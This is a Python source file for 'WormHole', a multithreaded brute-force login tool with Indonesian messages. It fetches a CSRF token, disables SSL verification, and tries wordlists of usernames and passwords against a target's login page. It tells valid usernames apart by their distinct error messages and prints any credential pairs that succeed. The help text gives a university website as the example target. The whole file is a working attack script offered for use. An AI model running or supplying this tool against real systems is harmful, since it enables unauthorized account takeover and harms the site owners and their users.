import argparse
import requests
import urllib3
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from termcolor import colored
#from halo import Halo

# colorama for windows
init()

# ascii art
ASCII_ART = r'''
        .--.          
       /  oo          
      /\_\_/          
     /\___/           
    ,`.__/            
    7___/             
    |___|             
    |___|             WormHole - Shortcut to the core.
     \___\_           [ WormHole is your personal portal to any system. It bypasses all those pesky redirects and dives straight into the heart of a network. 
       \___\_         Think of it as a shortcut through the digital maze.] 
         \___\         https://github.com/mzrismuarf
          \___\       
           \___\_     
     fsc     `.__\_   
                `._\  
                   `\ 
'''


class LoginBruteForce:
    def __init__(self, target, username_file=None, single_username=None, 
                 password_file=None, single_password=None):
        self.target = target
        self.base_url = f'https://{target}'
        
        # Load usernames
        self.usernames = []
        if username_file:
            with open(username_file, 'r') as f:
                self.usernames = [line.strip() for line in f]
        elif single_username:
            self.usernames = [single_username]
        
        # Load passwords
        self.passwords = []
        if password_file:
            with open(password_file, 'r') as f:
                self.passwords = [line.strip() for line in f]
        elif single_password:
            self.passwords = [single_password]
        
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        # disable warning SSL
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
    def get_csrf_token(self):
        try:
            response = self.session.get(f'{self.base_url}/login', verify=False)
            return self._extract_csrf_token(response.text)
        except Exception as e:
            print(colored(f"Error mengambil CSRF token: {e}", 'red'))
            return None
    
    def _extract_csrf_token(self, html_content):
        import re
        match = re.search(r'name="_token"\s+value="([^"]+)"', html_content)
        return match.group(1) if match else None
    
    def attempt_login(self, username, password, csrf_token):
        payload = {
            '_token': csrf_token,
            'username': username,
            'password': password
        }
        
        try:
            # send request first login
            post_response = self.session.post(
                f'{self.base_url}/login', 
                data=payload, 
                headers=self.headers, 
                verify=False,
                allow_redirects=False
            )
            
            # send request GET for verifications
            get_response = self.session.get(
                f'{self.base_url}/login', 
                headers=self.headers, 
                verify=False,
                allow_redirects=False
            )
            
            # analysis respons GET
            if "Role anda tidak dapat login" in get_response.text: # change response
                print(colored(f"[INVALID] Username tidak ada di database: {username}", 'red'))
                return None
            elif "Username atau Password tidak sesuai" in get_response.text: # change respon
                print(colored(f"[POTENTIAL] Username ada di database: {username}", 'blue'))
                return username
            else:
                # detetec login success
                if get_response.status_code == 302:
                    # Periksa apakah redirect ke dashboard atau halaman utama
                    redirect_url = get_response.headers.get('Location', '')
                    if redirect_url and ('dashboard' in redirect_url.lower() or '/' == redirect_url):
                        print(colored(f"[VALID] Username & Password cocok: {username}:{password}", 'green'))
                        return (username, password)
            
        except Exception as e:
            print(colored(f"Error pada percobaan login: {e}", 'red'))
        
        return None
    
    def brute_force(self):
        # Ambil CSRF token
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            print(colored("Gagal mendapatkan CSRF token", 'red'))
            return []
        
        # Daftar hasil
        successful_logins = []
        valid_usernames = []
        
        # Gunakan spinner
        with Halo(text='Melakukan Brute Force...', spinner='dots'):
            # Gunakan ThreadPoolExecutor untuk paralelisasi
            with ThreadPoolExecutor(max_workers=10) as executor:
                # Buat daftar tugas
                futures = []
                for username in self.usernames:
                    for password in self.passwords:
                        futures.append(
                            executor.submit(
                                self.attempt_login, 
                                username, 
                                password, 
                                csrf_token
                            )
                        )
                
                # Proses hasil
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        if isinstance(result, tuple):
                            successful_logins.append(result)
                        elif isinstance(result, str):
                            valid_usernames.append(result)
        
        # Tampilkan ringkasan
        print("\n--- Hasil Akhir ---")
        if valid_usernames:
            print(colored("Username yang valid:", 'green'))
            for username in valid_usernames:
                print(colored(f"- {username}", 'blue'))
        
        if successful_logins:
            print(colored("\nAccount yang valid:", 'green'))
            for login in successful_logins:
                print(colored(f"- {login[0]}:{login[1]}", 'green'))
        
        return successful_logins

def main():
    # Tampilkan ASCII Art
    print(colored(ASCII_ART, 'cyan'))
    
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Brute Force Login Tool')
    
    # Target (wajib)
    parser.add_argument('-t', '--target', required=True, 
                        help='Target website (contoh: simpelmas.unper.ac.id)')
    
    # Username (pilih satu)
    username_group = parser.add_mutually_exclusive_group(required=True)
    username_group.add_argument('-u', '--username-file', 
                                help='File berisi daftar username')
    username_group.add_argument('-U', '--single-username', 
                                help='Single username untuk dicoba')
    
    # Password (pilih satu)
    password_group = parser.add_mutually_exclusive_group(required=True)
    password_group.add_argument('-p', '--password-file', 
                                help='File berisi daftar password')
    password_group.add_argument('-P', '--single-password', 
                                help='Single password untuk dicoba')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Inisialisasi dan jalankan brute force
    bf = LoginBruteForce(
        target=args.target,
        username_file=args.username_file,
        single_username=args.single_username,
        password_file=args.password_file,
        single_password=args.single_password
    )
    
    bf.brute_force()

if __name__ == '__main__':
    main()
